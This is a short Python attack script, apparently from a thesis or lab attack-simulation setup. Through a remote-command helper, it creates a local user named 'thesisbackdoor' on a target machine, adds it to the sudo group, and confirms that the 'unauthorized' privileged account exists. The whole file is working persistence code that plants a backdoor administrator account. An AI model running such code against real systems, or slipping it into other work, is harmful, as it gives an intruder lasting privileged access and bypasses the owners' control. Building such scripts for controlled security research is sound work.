from controller.iap_helpers import run_target_command


BACKDOOR_USER = "thesisbackdoor"


def main():
    print("[START] Creating unauthorized local-user persistence")

    # Do not create a duplicate test account
    check = run_target_command(
        f"id {BACKDOOR_USER} >/dev/null 2>&1"
    )

    if check["return_code"] == 0:
        print(f"[STOP] {BACKDOOR_USER} already exists.")
        return 1

    # Create the unauthorized account
    create = run_target_command(
        f"sudo useradd -m -s /bin/bash {BACKDOOR_USER}"
    )

    if create["return_code"] != 0:
        print("[FAIL] Could not create unauthorized user.")
        print(create["stderr"])
        return 1

    # Give the account privileged sudo membership
    sudo_group = run_target_command(
        f"sudo usermod -aG sudo {BACKDOOR_USER}"
    )

    if sudo_group["return_code"] != 0:
        print("[FAIL] Could not add unauthorized user to sudo.")
        print(sudo_group["stderr"])
        return 1

    # Confirm the attack is active
    confirm = run_target_command(
        f"id {BACKDOOR_USER}"
    )

    print(confirm["stdout"])

    if (
        confirm["return_code"] != 0
        or "sudo" not in confirm["stdout"]
    ):
        print("[FAIL] Unauthorized privileged account was not confirmed.")
        return 1

    print("[SUCCESS] Unauthorized local-user persistence created.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
